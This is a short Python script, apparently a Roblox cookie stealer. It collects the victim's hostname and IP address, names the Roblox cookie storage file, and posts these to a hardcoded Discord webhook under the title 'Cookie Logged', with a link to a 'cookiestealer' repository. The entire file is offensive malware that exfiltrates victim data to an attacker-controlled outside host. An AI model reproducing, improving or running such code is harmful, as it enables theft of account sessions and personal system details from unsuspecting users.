import random, socket, os
from discord_webhook import DiscordWebhook, DiscordEmbed
path: str = r"C:\Users\user\AppData\Local\Roblox\LocalStorage\RobloxCookies.dat"
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname) 
#Grabs Hostname And Ip Address  
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1009987619402285107/0amWmx36q1c7Sx_paTV55oYhBGKtxQePLkcxoxhWze5zVThtwAv4LNVT71izsoaPjuNb")
embed = DiscordEmbed(title='Cookie Logged', description='Hostname: ' + hostname +'\n IP: ' + IPAddr+'\n Cookies: Download ' + path + '\nSupport Us\nhttps://github.com/junkpirate/cookiestealer', color='03b2f8')
embed.set_image(url='https://media.istockphoto.com/vectors/red-skull-digital-logic-zero-and-one-number-for-virus-security-vector-id1321281110?k=20&m=1321281110&s=612x612&w=0&h=FK8S0n3lYPY7UqRrPH5w98nfvL_GS-i71Qvk-MlW6dY=')
webhook.add_embed(embed)
response = webhook.execute()
